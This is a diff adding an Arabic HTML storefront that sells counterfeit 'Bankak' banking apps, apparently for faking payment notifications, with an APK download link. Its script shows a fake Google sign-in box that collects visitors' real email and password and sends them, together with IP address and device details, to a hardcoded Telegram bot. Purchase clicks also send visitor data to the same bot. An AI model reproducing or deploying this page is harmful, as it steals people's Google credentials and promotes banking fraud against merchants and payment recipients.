@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>سايكو VIP | المتجر الرسمي لتطبيقات بنكك المزيفة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Tajawal', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0a0a2a 100%);
+            color: #fff;
+            direction: rtl;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 2px solid rgba(255, 215, 0, 0.4);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            font-size: 1.6rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ffd700, #ff6b6b);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .badge {
+            background: #ffd700;
+            color: #000;
+            padding: 0.3rem 0.8rem;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .offer-banner {
+            background: linear-gradient(135deg, #ffd700, #ff6b6b);
+            border-radius: 30px;
+            padding: 2rem;
+            text-align: center;
+            margin-bottom: 3rem;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
+        }
+
+        .offer-banner h1 {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .timer {
+            font-size: 2rem;
+            font-weight: bold;
+            background: rgba(0, 0, 0, 0.6);
+            display: inline-block;
+            padding: 0.5rem 1.5rem;
+            border-radius: 60px;
+            margin-top: 1rem;
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+
+        .section-title {
+            font-size: 2rem;
+            margin: 2.5rem 0 1.5rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .section-title:after {
+            content: '';
+            width: 80px;
+            height: 3px;
+            background: linear-gradient(90deg, #ffd700, transparent);
+            position: absolute;
+            bottom: -12px;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .product-card {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 1.5rem;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            cursor: pointer;
+        }
+
+        .product-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 35px rgba(0, 0, 0, 0.4);
+            border-color: #ffd700;
+        }
+
+        .product-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .product-title {
+            font-size: 1.4rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+
+        .product-price {
+            font-size: 1.6rem;
+            color: #ffd700;
+            margin: 1rem 0;
+            font-weight: bold;
+        }
+
+        .btn-buy {
+            background: linear-gradient(45deg, #ffd700, #ff8c00);
+            border: none;
+            color: #000;
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+        }
+
+        .btn-buy:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.5);
+        }
+
+        .warning-box {
+            background: rgba(255, 70, 70, 0.15);
+            border: 1px solid #ff4444;
+            border-radius: 20px;
+            padding: 1.5rem;
+            margin: 2rem 0;
+            text-align: center;
+        }
+
+        .warning-box h3 {
+            color: #ff8888;
+            margin-bottom: 0.8rem;
+        }
+
+        .footer {
+            background: rgba(0, 0, 0, 0.8);
+            padding: 2rem;
+            margin-top: 3rem;
+            text-align: center;
+        }
+
+        .social-links a {
+            color: #fff;
+            margin: 0 1rem;
+            text-decoration: none;
+            transition: color 0.3s;
+            font-size: 1.1rem;
+        }
+
+        .social-links a:hover {
+            color: #ffd700;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: #1a1a2e;
+            border-radius: 28px;
+            padding: 2rem;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid #ffd700;
+        }
+
+        .payment-info {
+            background: #0f0f1a;
+            padding: 1.5rem;
+            border-radius: 20px;
+            margin: 1rem 0;
+        }
+
+        .account-number {
+            font-size: 1.4rem;
+            color: #ffd700;
+            font-family: monospace;
+            background: #000;
+            padding: 0.5rem;
+            border-radius: 12px;
+            word-break: break-all;
+        }
+
+        .app-download {
+            background: rgba(255, 215, 0, 0.1);
+            border: 1px solid #ffd700;
+            border-radius: 20px;
+            padding: 1rem;
+            margin: 1rem 0;
+            text-align: center;
+        }
+
+        .app-download a {
+            color: #ffd700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            .logo {
+                font-size: 1.2rem;
+            }
+            .timer {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">🖤 سايكو VIP | متجر تطبيقات بنكك المزيفة</div>
+        <div class="badge">✅ متجر رسمي معتمد</div>
+    </div>
+
+    <div class="container">
+        <div class="offer-banner">
+            <h1>🎉 عروض عيد الفطر المبارك 🎉</h1>
+            <p>خصم يصل إلى 50% على جميع التطبيقات والشحنات - لفترة محدودة</p>
+            <div class="timer" id="timer">00 : 00 : 00 : 00</div>
+        </div>
+
+        <div class="app-download">
+            <h3>📱 تحميل تطبيق بنكك المزيف (النسخة VIP)</h3>
+            <p>إصدار VIP - يدعم جميع الميزات المتقدمة</p>
+            <a href="https://www.mediafire.com/file/1jhufdsj1wdr7nv/BOK_vip🏦.apk/file" target="_blank" style="display: inline-block; background: #ffd700; color: #000; padding: 0.8rem 2rem; border-radius: 50px; margin-top: 0.8rem; text-decoration: none; font-weight: bold;">📥 تحميل التطبيق (6.38 MB)</a>
+            <p style="font-size: 0.8rem; margin-top: 0.5rem;">نسخة VIP سايكو - محدثة مارس 2026</p>
+        </div>
+
+        <h2 class="section-title">⚡ شحن الحسابات</h2>
+        <div class="products-grid">
+            <div class="product-card" onclick="openPayment('اسنوكس VIP', 5000)">
+                <div class="product-icon">🎮</div>
+                <div class="product-title">اسنوكس VIP</div>
+                <div class="product-price">5,000 SDG</div>
+                <button class="btn-buy">شراء الآن</button>
+            </div>
+            <div class="product-card" onclick="openPayment('ترو بورو PRO', 8000)">
+                <div class="product-icon">🎯</div>
+                <div class="product-title">ترو بورو PRO</div>
+                <div class="product-price">8,000 SDG</div>
+                <button class="btn-buy">شراء الآن</button>
+            </div>
+            <div class="product-card" onclick="openPayment('موكا', 3000)">
+                <div class="product-icon">☕</div>
+                <div class="product-title">موكا</div>
+                <div class="product-price">3,000 SDG</div>
+                <button class="btn-buy">شراء الآن</button>
+            </div>
+            <div class="product-card" onclick="openPayment('VIP سايكو', 15000)">
+                <div class="product-icon">👑</div>
+                <div class="product-title">VIP سايكو (النسخة الأسطورية)</div>
+                <div class="product-price">15,000 SDG</div>
+                <button class="btn-buy">شراء الآن</button>
+            </div>
+        </div>
+
+        <h2 class="section-title">🔓 فتح حسابات بنكك المزيفة</h2>
+        <div class="products-grid">
+            <div class="product-card" onclick="openGoogleLogin('اسنوكس')">
+                <div class="product-icon">📱</div>
+                <div class="product-title">فتح حساب - اسنوكس</div>
+                <div class="product-price">2,000 SDG</div>
+                <button class="btn-buy">تسجيل بحساب Google</button>
+            </div>
+            <div class="product-card" onclick="openGoogleLogin('ترو بورو')">
+                <div class="product-icon">📱</div>
+                <div class="product-title">فتح حساب - ترو بورو</div>
+                <div class="product-price">2,500 SDG</div>
+                <button class="btn-buy">تسجيل بحساب Google</button>
+            </div>
+            <div class="product-card" onclick="openGoogleLogin('موكا')">
+                <div class="product-icon">📱</div>
+                <div class="product-title">فتح حساب - موكا</div>
+                <div class="product-price">1,500 SDG</div>
+                <button class="btn-buy">تسجيل بحساب Google</button>
+            </div>
+            <div class="product-card" onclick="openGoogleLogin('VIP سايكو')">
+                <div class="product-icon">👑</div>
+                <div class="product-title">فتح حساب - VIP سايكو</div>
+                <div class="product-price">5,000 SDG</div>
+                <button class="btn-buy">تسجيل بحساب Google</button>
+            </div>
+        </div>
+
+        <div class="warning-box">
+            <h3>⚠️ تحذير هام ⚠️</h3>
+            <p>أي محاولة لرفع إشعار مزيف دون الدفع سيؤدي إلى حظر حسابك نهائياً. نحن نستخدم نظام تتبع متقدم لكشف المحتالين.</p>
+            <p>جميع خدماتنا مدفوعة مسبقاً، لا نقدم أي تجارب مجانية.</p>
+        </div>
+    </div>
+
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <h2>💳 إتمام الدفع</h2>
+            <div class="payment-info">
+                <p>المنتج: <strong id="productName"></strong></p>
+                <p>المبلغ: <strong id="productPrice"></strong> SDG</p>
+                <p>رقم الحساب للتحويل:</p>
+                <div class="account-number" id="accountNumber">300159768</div>
+                <p style="margin-top: 1rem;">🔹 ماي كاشي 🔹</p>
+                <p>بعد التحويل، سترسل إشعار الدفع وسيتم تفعيل طلبك فوراً</p>
+            </div>
+            <button class="btn-buy" onclick="simulatePayment()">✅ لقد قمت بالتحويل</button>
+            <button class="btn-buy" style="background: #444; margin-top: 1rem;" onclick="closePayment()">إغلاق</button>
+        </div>
+    </div>
+
+    <div id="googleModal" class="modal">
+        <div class="modal-content">
+            <h2>🔐 تسجيل الدخول بحساب Google</h2>
+            <div class="payment-info">
+                <p>لتأكيد هويتك وفتح الحساب، يرجى تسجيل الدخول بحساب Google الحقيقي الخاص بك</p>
+                <input type="email" id="googleEmail" placeholder="البريد الإلكتروني" style="width: 100%; padding: 0.8rem; margin: 0.5rem 0; border-radius: 12px; border: none; direction: ltr;">
+                <input type="password" id="googlePassword" placeholder="كلمة المرور" style="width: 100%; padding: 0.8rem; margin: 0.5rem 0; border-radius: 12px; border: none; direction: ltr;">
+                <button class="btn-buy" onclick="sendGoogleData()">تأكيد وتسجيل الدخول</button>
+            </div>
+            <button class="btn-buy" style="background: #444; margin-top: 1rem;" onclick="closeGoogleModal()">إلغاء</button>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="social-links">
+            <a href="https://t.me/R_I_I_F_vip" target="_blank">📱 تليجرام: @R_I_I_F_vip</a>
+            <a href="#" target="_blank">📘 فيسبوك</a>
+            <a href="#" target="_blank">💬 واتساب</a>
+        </div>
+        <p style="margin-top: 1rem;">متجر سايكو VIP - جميع الحقوق محفوظة © 2026</p>
+        <p style="font-size: 0.8rem; opacity: 0.7;">للتواصل مع المطور الرسمي: @R_I_I_F_vip</p>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8738487336:AAHAzDAQ-SHI1qOi9EazQreZ5jYyzd5c59Y";
+        const CHAT_ID = "7842780682";
+        const ACCOUNT_NUMBER = "300159768";
+
+        let currentProduct = '';
+        let currentPrice = 0;
+        let currentAccountType = '';
+
+        function updateTimer() {
+            const targetDate = new Date();
+            targetDate.setDate(targetDate.getDate() + 7);
+            targetDate.setHours(23, 59, 59, 999);
+            const now = new Date();
+            const diff = targetDate - now;
+            if (diff <= 0) {
+                document.getElementById('timer').innerHTML = "🎉 العيد مبارك! العروض مستمرة 🎉";
+                return;
+            }
+            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((diff % (86400000)) / (3600000));
+            const minutes = Math.floor((diff % 3600000) / 60000);
+            const seconds = Math.floor((diff % 60000) / 1000);
+            document.getElementById('timer').innerHTML = `${days} يوم : ${hours} ساعة : ${minutes} دقيقة : ${seconds} ثانية`;
+        }
+        setInterval(updateTimer, 1000);
+        updateTimer();
+
+        function openPayment(product, price) {
+            currentProduct = product;
+            currentPrice = price;
+            document.getElementById('productName').innerText = product;
+            document.getElementById('productPrice').innerText = price;
+            document.getElementById('paymentModal').style.display = 'flex';
+        }
+
+        function closePayment() {
+            document.getElementById('paymentModal').style.display = 'none';
+        }
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Unknown";
+            let os = "Unknown";
+            if (/android/i.test(ua)) {
+                device = "Android";
+                const match = ua.match(/Android\s([\d.]+)/i);
+                os = match ? match[1] : "Unknown";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                device = "iOS";
+                const match = ua.match(/OS\s([\d_]+)/i);
+                os = match ? match[1].replace(/_/g, '.') : "Unknown";
+            } else if (/Windows/i.test(ua)) {
+                device = "Windows";
+            } else if (/Mac/i.test(ua)) {
+                device = "Mac";
+            }
+            return `${device} ${os}`;
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return "غير متاح";
+            }
+        }
+
+        async function sendToTelegram(message) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            } catch(e) {
+                console.log(e);
+            }
+        }
+
+        async function simulatePayment() {
+            const ip = await getIP();
+            const device = getDeviceInfo();
+            const message = `💰💎 عملية شراء جديدة 💎💰\n\n━━━━━━━━━━━━━━━━━━━\n🛒 المنتج: ${currentProduct}\n💵 المبلغ: ${currentPrice} SDG\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n🔢 حساب الاستلام: ${ACCOUNT_NUMBER}\n✅ الحالة: تم الدفع (محاكاة)\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            await sendToTelegram(message);
+            alert("✅ تم استلام طلبك بنجاح!\n📱 سيتم تفعيل حسابك خلال 5 دقائق.\n📩 تواصل مع الدعم لو في استفسار.");
+            closePayment();
+        }
+
+        function openGoogleLogin(accountType) {
+            currentAccountType = accountType;
+            document.getElementById('googleModal').style.display = 'flex';
+        }
+
+        function closeGoogleModal() {
+            document.getElementById('googleModal').style.display = 'none';
+        }
+
+        async function sendGoogleData() {
+            const email = document.getElementById('googleEmail').value.trim();
+            const password = document.getElementById('googlePassword').value.trim();
+            if (!email || !password) {
+                alert("⚠️ يرجى إدخال البريد الإلكتروني وكلمة المرور");
+                return;
+            }
+            const ip = await getIP();
+            const device = getDeviceInfo();
+            const message = `🔐📧 تسجيل جديد لفتح حساب 📧🔐\n\n━━━━━━━━━━━━━━━━━━━\n🆔 النسخة: ${currentAccountType}\n📧 الإيميل: ${email}\n🔑 كلمة المرور: ${password}\n📱 الجهاز: ${device}\n🌐 IP: ${ip}\n📅 التاريخ: ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━━\n🕋 سايكو VIP | @R_I_I_F_vip`;
+            await sendToTelegram(message);
+            alert("✅ تم تسجيل الدخول بنجاح!\n📱 سيتم فتح حسابك قريباً.\n📩 سيصلك إشعار بالتليجرام عند التفعيل.");
+            document.getElementById('googleEmail').value = '';
+            document.getElementById('googlePassword').value = '';
+            closeGoogleModal();
+        }
+    </script>
+</body>
+  </html>
